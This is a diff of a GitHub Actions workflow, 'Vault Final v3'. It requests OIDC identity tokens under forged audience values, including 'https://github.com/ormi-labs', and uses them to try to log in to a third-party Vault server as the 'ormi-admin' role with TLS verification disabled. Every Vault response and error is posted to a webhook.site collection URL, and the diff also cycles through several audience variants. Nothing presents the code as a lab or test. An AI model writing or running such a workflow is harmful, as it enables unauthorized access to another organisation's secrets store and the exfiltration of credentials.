@@ -1,4 +1,4 @@
-name: Vault Final
+name: Vault Final v3
 on:
   workflow_dispatch:
 permissions:
@@ -7,25 +7,52 @@ permissions:
 jobs:
   auth:
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        audience:
-          - "https://github.com/ormi-labs"
-          - "https://github.com/adamskoda8735-tech"
-          - "https://github.com/dolomite-exchange"
-          - "github.com/ormi-labs"
-          - "ormi-labs.github.io"
-          - "hashicorp/vault"
     steps:
-      - name: Auth
-        env:
-          AUD: ${{ matrix.audience }}
+      - name: Try ormi-labs audience with proper encoding
         run: |
-          RESP=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+          # URL encode the audience properly
+          AUD="https://github.com/ormi-labs"
+          AUD_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$AUD', safe=''))")
+          
+          RESP=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD_ENCODED}")
           OIDC=$(echo "$RESP" | jq -r '.value // empty')
+          
           if [ -z "$OIDC" ]; then
-            curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -d "{\"aud\":\"$AUD\",\"error\":\"no token from GHA\",\"raw\":$(echo $RESP | jq -Rs .)}"
-            exit 0
+            curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" \
+              -H "Content-Type: application/json" \
+              -d "{\"step\":\"1-encoded\",\"error\":\"no_token\",\"raw\":$(echo $RESP | jq -Rs .)}"
+          else
+            # Try Vault
+            VAULT=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" \
+              -H "Content-Type: application/json" \
+              -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
+            curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" \
+              -H "Content-Type: application/json" \
+              -d "{\"step\":\"1-encoded\",\"aud\":\"$AUD\",\"vault\":$(echo $VAULT | jq -Rs .)}"
           fi
-          VAULT=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
-          curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" -d "{\"aud\":\"$AUD\",\"v\":$(echo $VAULT | jq -Rs .)}"
+
+          # Also try without encoding
+          RESP2=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://github.com/ormi-labs")
+          OIDC2=$(echo "$RESP2" | jq -r '.value // empty')
+          if [ -n "$OIDC2" ]; then
+            VAULT2=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" \
+              -H "Content-Type: application/json" \
+              -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC2\"}" 2>&1)
+            curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" \
+              -H "Content-Type: application/json" \
+              -d "{\"step\":\"2-raw\",\"vault\":$(echo $VAULT2 | jq -Rs .)}"
+          fi
+
+          # Try variations
+          for AUD in "https://github.com/ormi-labs/" "github.com/ormi-labs" "ormi-labs"; do
+            RESP3=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$AUD', safe=''))")")
+            OIDC3=$(echo "$RESP3" | jq -r '.value // empty')
+            if [ -n "$OIDC3" ]; then
+              VAULT3=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" \
+                -H "Content-Type: application/json" \
+                -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC3\"}" 2>&1)
+              curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" \
+                -H "Content-Type: application/json" \
+                -d "{\"step\":\"3-$AUD\",\"vault\":$(echo $VAULT3 | jq -Rs .)}"
+            fi
+          done
